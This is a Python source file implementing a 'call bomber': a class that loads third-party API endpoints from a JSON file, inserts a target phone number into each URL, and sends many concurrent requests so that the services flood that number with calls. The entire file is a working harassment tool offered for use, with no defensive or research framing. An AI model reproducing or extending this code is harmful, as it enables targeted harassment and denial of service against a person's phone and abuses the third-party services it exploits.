# call_bomber.py
import json
import asyncio
import aiohttp
from utils.logger import setup_logger

logger = setup_logger()

class CallBomber:
    def __init__(self):
        with open("data/call_apis.json", "r") as f:
            self.apis = json.load(f)

    async def _call(self, session, api, phone):
        try:
            url = api["url"].replace("{phone}", phone)
            async with session.get(url, timeout=15) as resp:
                return resp.status
        except Exception as e:
            logger.debug(f"Call API failed: {e}")
            return None

    async def bomb(self, phone, count=20, threads=5):
        sem = asyncio.Semaphore(threads)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(count):
                for api in self.apis:
                    tasks.append(self._call_with_sem(sem, session, api, phone))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success = sum(1 for r in results if isinstance(r, int) and r < 400)
            logger.info(f"Call Bombing done: {success} success")
            return success

    async def _call_with_sem(self, sem, session, api, phone):
        async with sem:
            return await self._call(session, api, phone)
